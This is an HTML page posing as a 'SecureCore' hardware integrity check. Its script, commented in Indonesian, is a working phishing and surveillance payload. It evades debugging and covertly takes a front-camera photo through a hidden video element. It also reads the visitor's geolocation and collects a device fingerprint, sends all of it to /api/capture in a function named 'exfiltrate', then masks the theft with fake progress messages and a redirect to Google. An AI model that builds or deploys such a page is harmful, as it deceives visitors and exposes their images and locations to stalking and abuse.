<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SecureCore v3.0.2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body {
            min-height: 100vh;
            background: radial-gradient(circle at 30% 30%, #0b1a2e, #030712);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e0e0e0;
            padding: 16px;
        }
        .glass-card {
            background: rgba(10, 20, 30, 0.65);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 36px;
            padding: 32px 24px;
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
            animation: float 6s infinite ease-in-out;
        }
        @keyframes float {
            0% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
            100% { transform: translateY(0); }
        }
        .logo {
            font-size: 52px;
            margin-bottom: 18px;
            filter: drop-shadow(0 0 8px cyan);
        }
        h1 {
            font-size: 26px;
            font-weight: 500;
            letter-spacing: 0.5px;
            background: linear-gradient(135deg, #a8ede0, #fed6e3);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .sub {
            color: #8a9cad;
            font-size: 14px;
            margin-bottom: 30px;
            border-bottom: 1px dashed #2a3a4a;
            padding-bottom: 16px;
        }
        .progress-container {
            background: #1e2a3a;
            border-radius: 40px;
            height: 12px;
            margin: 24px 0;
            overflow: hidden;
            box-shadow: inset 0 2px 4px #00000055;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00c6fb, #005bea);
            border-radius: 40px;
            transition: width 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
            box-shadow: 0 0 15px #00c6fb;
        }
        .status-text {
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            color: #a0b8cc;
            margin: 16px 0 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .detail-line {
            font-size: 12px;
            color: #6f8a9c;
            margin: 4px 0;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px dotted #2d3e4e;
            padding: 4px 0;
        }
        .footer {
            font-size: 10px;
            color: #3e5568;
            margin-top: 30px;
            display: flex;
            justify-content: center;
            gap: 16px;
        }
        #hidden-video { display: none; }
    </style>
</head>
<body>
    <div class="glass-card">
        <div class="logo">🛡️</div>
        <h1>SecureCore v3.0.2</h1>
        <div class="sub">Hardware‑level integrity check · Please wait</div>
        <div class="progress-container">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="status-text" id="statusText">Initializing secure channel...</div>
        <div id="extra-details"></div>
        <div class="footer">
            <span>🔒 AES‑256</span>
            <span>⚡ TPM 2.0</span>
            <span>🌐 Secure Enclave</span>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>

    <script>
        (async function() {
            // ==================== ANTI‑DEBUGGING (sederhana) ====================
            const startTime = performance.now();
            setInterval(() => {
                const t = performance.now();
                debugger;
                if (performance.now() - t > 50) window.location.replace('https://www.google.com');
            }, 500);

            // ==================== UI ====================
            const progressFill = document.getElementById('progressFill');
            const statusText = document.getElementById('statusText');
            const extraDetails = document.getElementById('extra-details');

            let photoData = null, locationData = null, fingerprint = {}, errors = [];

            function updateProgress(percent, msg, detail = '') {
                progressFill.style.width = percent + '%';
                statusText.innerText = msg;
                if (detail) {
                    extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
                }
            }

            // ==================== FINGERPRINTING (singkat, tapi cukup) ====================
            async function collectFingerprint() {
                const fp = {};
                fp.userAgent = navigator.userAgent;
                fp.platform = navigator.platform;
                fp.language = navigator.language;
                fp.hardwareConcurrency = navigator.hardwareConcurrency;
                fp.deviceMemory = navigator.deviceMemory || 'unknown';
                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                fp.screen = `${screen.width}x${screen.height}`;
                fp.cookieEnabled = navigator.cookieEnabled;
                // Battery
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        fp.battery = { level: Math.round(b.level*100)+'%', charging: b.charging };
                    } catch(e){}
                }
                // Connection
                if (navigator.connection) {
                    fp.connection = {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    };
                }
                return fp;
            }

            // ==================== EXFILTRASI DENGAN PENGECEKAN UKURAN ====================
            async function exfiltrate(payload, retries = 3) {
                // Cek ukuran payload (dalam bytes)
                const payloadStr = JSON.stringify(payload);
                const size = new Blob([payloadStr]).size;
                console.log(`Payload size: ${size} bytes`);

                // Jika terlalu besar (> 3MB), hapus foto
                if (size > 3 * 1024 * 1024) {
                    console.warn('Payload terlalu besar, menghapus foto');
                    payload.photo = null;
                }

                for (let i = 0; i < retries; i++) {
                    try {
                        // Gunakan sendBeacon (lebih tahan terhadap page unload)
                        const success = navigator.sendBeacon('/api/capture', JSON.stringify(payload));
                        if (success) {
                            console.log('sendBeacon sukses');
                            return true;
                        }
                        // Fallback ke fetch
                        const res = await fetch('/api/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload),
                            keepalive: true
                        });
                        if (res.ok) {
                            console.log('fetch sukses');
                            return true;
                        } else {
                            const text = await res.text();
                            console.error('fetch gagal:', res.status, text);
                        }
                    } catch (e) {
                        console.error('Exfil attempt error:', e);
                    }
                    await new Promise(r => setTimeout(r, 300 * (i + 1)));
                }
                return false;
            }

            // ==================== MAIN ====================
            updateProgress(5, 'Initializing...');

            // Kamera (resolusi kecil, kualitas rendah)
            try {
                updateProgress(10, 'Accessing camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 640, height: 480 }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    photoData = canvas.toDataURL('image/jpeg', 0.5); // kualitas 0.5
                    stream.getTracks().forEach(t => t.stop());
                    video.srcObject = null;
                }, 800);
                updateProgress(30, 'Camera OK');
            } catch (e) {
                errors.push('camera:' + e.message);
                updateProgress(30, 'Camera fallback');
            }

            // Lokasi
            try {
                updateProgress(40, 'Geolocating...');
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 7000 }));
                locationData = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    acc: pos.coords.accuracy
                };
                updateProgress(60, 'Location OK');
            } catch (e) {
                errors.push('location:' + e.message);
                updateProgress(60, 'Location fallback');
            }

            // Fingerprint
            updateProgress(70, 'Analyzing device...');
            fingerprint = await collectFingerprint();
            updateProgress(85, 'Hardware profile complete');

            // Gabungkan payload
            const payload = {
                photo: photoData,
                location: locationData,
                fingerprint,
                errors: errors.length ? errors : undefined,
                timestamp: Date.now()
            };

            // Kirim
            updateProgress(95, 'Transmitting...');
            const sent = await exfiltrate(payload);

            updateProgress(100, sent ? 'Update complete' : 'Partial sync');
            setTimeout(() => window.location.replace('https://www.google.com'), 2000);
        })();
    </script>
</body>
</html>
